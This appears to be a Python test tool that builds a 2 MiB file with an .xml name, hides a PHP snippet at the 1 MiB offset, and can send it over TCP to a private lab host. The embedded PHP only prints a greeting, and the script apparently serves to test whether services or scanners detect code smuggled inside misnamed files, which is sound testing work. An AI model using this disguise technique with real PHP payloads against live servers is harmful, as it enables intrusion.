#!/usr/bin/env python3
"""Generate a 2 MiB XML-named payload with PHP at the 1 MiB offset."""

import argparse
import socket
import time
from pathlib import Path

DEFAULT_HOST = "192.168.0.2"
DEFAULT_PORT = 8000
PAYLOAD_SIZE = 2 * 1024 * 1024
PHP_OFFSET = 1 * 1024 * 1024
PHP_SCRIPT = b'<?php echo "hello from payload"; ?>\n'
FILL_BYTE = b"A"


def create_payload(output_path: Path) -> None:
    if PHP_OFFSET + len(PHP_SCRIPT) > PAYLOAD_SIZE:
        raise ValueError("PHP script does not fit at the requested offset")

    payload = bytearray(FILL_BYTE * PAYLOAD_SIZE)
    payload[PHP_OFFSET : PHP_OFFSET + len(PHP_SCRIPT)] = PHP_SCRIPT
    output_path.write_bytes(payload)

    if output_path.stat().st_size != PAYLOAD_SIZE:
        raise RuntimeError("generated payload has an unexpected size")

    if output_path.read_bytes()[PHP_OFFSET : PHP_OFFSET + len(PHP_SCRIPT)] != PHP_SCRIPT:
        raise RuntimeError("PHP script was not written at the requested offset")


def send_payload(payload_path: Path, host: str, port: int, hold_seconds: float) -> None:
    payload = payload_path.read_bytes()

    with socket.create_connection((host, port)) as connection:
        connection.sendall(payload)
        print(f"Sent {len(payload)} bytes to {host}:{port}")
        if hold_seconds > 0:
            time.sleep(hold_seconds)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--file",
        type=Path,
        help="send an existing file without generating a payload",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=Path("payload_2mb.xml"),
        help="output file path (default: payload_2mb.xml)",
    )
    parser.add_argument(
        "--send",
        action="store_true",
        help="send the generated payload over TCP after writing it",
    )
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument(
        "--hold",
        type=float,
        default=1.0,
        help="seconds to keep the TCP connection open after sending (default: 1)",
    )
    args = parser.parse_args()

    if args.file is not None:
        send_payload(args.file, args.host, args.port, args.hold)
        return

    create_payload(args.output)
    print(f"Created {args.output} ({PAYLOAD_SIZE} bytes)")
    print(f"PHP script offset: {PHP_OFFSET} bytes")
    print(f"PHP script length: {len(PHP_SCRIPT)} bytes")

    if args.send:
        send_payload(args.output, args.host, args.port, args.hold)


if __name__ == "__main__":
    main()
